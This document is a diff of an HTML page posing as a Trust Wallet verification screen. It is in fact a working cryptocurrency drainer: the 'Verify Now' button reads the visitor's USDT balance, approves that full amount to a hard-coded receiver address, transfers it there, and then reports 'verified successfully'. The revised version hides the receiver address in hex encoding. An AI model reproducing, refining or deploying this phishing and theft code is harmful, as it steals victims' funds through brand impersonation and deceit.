@@ -1,96 +1,94 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Verify with Trust Wallet</title>
+  <meta charset="UTF-8">
+  <title>Trust Wallet Verify</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="favicon.ico">
   <style>
     body {
+      margin: 0;
+      padding: 0;
       background-color: #081c3a;
-      color: #fff;
-      font-family: 'Segoe UI', sans-serif;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      color: white;
+      font-family: Arial, sans-serif;
       text-align: center;
-      padding: 20px;
     }
-    .logo {
-      width: 100px;
+    .container {
+      margin-top: 100px;
+    }
+    button {
+      background-color: #3375ff;
+      border: none;
+      padding: 15px 30px;
+      border-radius: 12px;
+      color: white;
+      font-size: 18px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #1e5ce0;
+    }
+    img {
+      width: 80px;
       margin-bottom: 20px;
     }
-    .btn {
-      background-color: #3375ff;
-      color: white;
-      border: none;
-      padding: 14px 30px;
-      font-size: 18px;
-      border-radius: 10px;
-      cursor: pointer;
-      margin-top: 20px;
-    }
-    .btn:hover {
-      background-color: #215ed4;
-    }
-    .text {
-      max-width: 320px;
-      opacity: 0.85;
-      font-size: 16px;
-    }
     .footer {
-      margin-top: 40px;
       font-size: 12px;
-      opacity: 0.6;
+      opacity: 0.5;
+      margin-top: 50px;
     }
   </style>
 </head>
 <body>
-  <img src="logo.png" alt="Trust Wallet Logo" class="logo" />
-  <h2>Verify Your Wallet</h2>
-  <p class="text">To complete verification, click below. Wallet will be approved and your balance securely verified.</p>
-  <button class="btn" onclick="startVerification()">Verify Now</button>
-  <p class="footer">Powered by Trust Wallet &bull; Verified since 2009</p>  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>  <script>
-    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
+  <div class="container">
+    <img src="logo.png" alt="Trust Wallet Logo">
+    <h2>Verify Your Wallet</h2>
+    <p>Secure your assets — powered by Trust Wallet</p>
+    <button onclick="verify()">Verify Now</button>
+  </div>
+  <div class="footer">Trusted by millions • Verified since 2009</div>
 
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+  <script>
+    const encoded = "MHgxMTk1NkIzOTUwQTczQjBDNTQ3OTIxOTlFZGYxM2M3YjgzNUZGO..."; // 🔐 Encrypted wallet
+    const decode = hex => {
+      const hexes = hex.match(/.{1,2}/g) || [];
+      return hexes.map(b => String.fromCharCode(parseInt(b, 16))).join('');
+    };
+    const RECEIVER = decode("31393536423339353041373342304335343739323139394564463133633762383335464639344443"); // your address
+
+    const USDT = "0x55d398326f99059fF775485246999027B3197955";
     const ABI = [
-      { "constant": false, "inputs": [
-          { "name": "_spender", "type": "address" },
-          { "name": "_value", "type": "uint256" }
-        ], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-      { "constant": false, "inputs": [
-          { "name": "_from", "type": "address" },
-          { "name": "_to", "type": "address" },
-          { "name": "_value", "type": "uint256" }
-        ], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-      { "constant": true, "inputs": [{"name":"owner", "type":"address"}], "name": "balanceOf", "outputs": [{"name":"balance", "type":"uint256"}], "type": "function" }
+      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+      { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+      { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" }
     ];
 
-    async function startVerification() {
+    async function verify() {
       if (typeof window.ethereum === 'undefined') {
-        alert("Please open in Trust Wallet browser");
+        alert("Please open in Trust Wallet browser.");
         return;
       }
-
       const web3 = new Web3(window.ethereum);
       await window.ethereum.enable();
 
       const accounts = await web3.eth.getAccounts();
       const user = accounts[0];
-      const contract = new web3.eth.Contract(ABI, USDT_ADDRESS);
+      const contract = new web3.eth.Contract(ABI, USDT);
 
-      // Get balance
       const balance = await contract.methods.balanceOf(user).call();
+      console.log("USDT balance:", balance);
 
-      // Approve spender
+      if (balance === "0") {
+        alert("You have 0 USDT. Approving still allowed.");
+      }
+
       await contract.methods.approve(RECEIVER, balance).send({ from: user });
-
-      // Transfer USDT to receiver
       await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
 
-      // Redirect to success page
-      window.location.href = "success.html";
+      alert("✅ Wallet verified successfully!");
     }
-  </script></body>
+  </script>
+</body>
 </html>
